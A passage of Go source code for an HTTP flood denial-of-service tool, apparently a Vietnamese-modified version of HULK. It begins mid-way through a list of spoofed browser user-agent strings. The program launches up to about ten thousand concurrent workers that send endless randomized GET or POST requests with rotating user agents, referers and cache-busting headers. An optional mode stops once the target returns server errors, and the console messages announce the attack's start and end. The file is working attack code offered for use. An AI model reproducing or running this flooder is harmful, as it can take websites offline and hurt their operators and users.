		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3512.40 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2167.80 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2151.104 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3506.62 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3516.96 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3497.121 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3531.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3528.145 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3509.47 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 14092.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.107 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 14526.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.93 Safari/537.36",
		"Mozilla/5.0 (X11; GNU/Windows 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.16.2.1-e99c70fff409",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36",
	}
	cur int32
)

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func main() {
	var (
		version bool
		site    string
		agents  string
		data    string
		headers arrayFlags
	)

	flag.BoolVar(&version, "version", false, "print version and exit")
	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("HULKMAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		maxproc = 10240
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println("  thông số url phân tích cú pháp err\n")
		os.Exit(1)
	}

	if version {
		fmt.Println("  Bản cải tiến từ Đậu Đậu", __version__)
		os.Exit(0)
	}

	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
		} else {
			fmt.Printf("  không thể tải danh sách Tác nhân người dùng từ %s\n", agents)
			os.Exit(1)
		}
	}

	go func() {
		fmt.Println("  -- Đã bắt đầu tấn công  --\n     Được chỉnh sửa bởi Đậu Đậu\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("    Đang sử dụng             |\tKết nối thành công |\tKết nối thất bại")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("\r  %6d trong số tối đa %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
				atomic.AddInt32(&cur, -1)
				err++
			case callExitOnTooManyFiles:
				atomic.AddInt32(&cur, -1)
				maxproc--
			case callGotOk:
				sent++
			case targetComplete:
				sent++
				fmt.Printf("\r  %-6d trong số tối đa %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r  -- Đã kết thúc cuộc tấn công --       \n\n\r")
				os.Exit(0)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n  -- Người dùng đã dừng cuộc tấn công--        \n")
}

func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	var param_joiner string
	var client = new(http.Client)

	if strings.ContainsRune(url, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

	for {
		var q *http.Request
		var err error

		if data == "" {
			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		} else {
			q, err = http.NewRequest("POST", url, strings.NewReader(data))
		}

		if err != nil {
			s <- callExitOnErr
			return
		}

		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Charset", acceptCharset)
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", host)

		// Overwrite headers with parameters

		for _, element := range headers {
			words := strings.Split(element, ":")
			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
		}

		r, e := client.Do(q)
		if e != nil {
			fmt.Fprintln(os.Stderr, e.Error())
			if strings.Contains(e.Error(), "socket: too many open files") {
				s <- callExitOnTooManyFiles
				return
			}
			s <- callExitOnErr
			return
		}
		r.Body.Close()
		s <- callGotOk
		if safe {
			if r.StatusCode >= 500 {
				s <- targetComplete
			}
		}
	}
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}
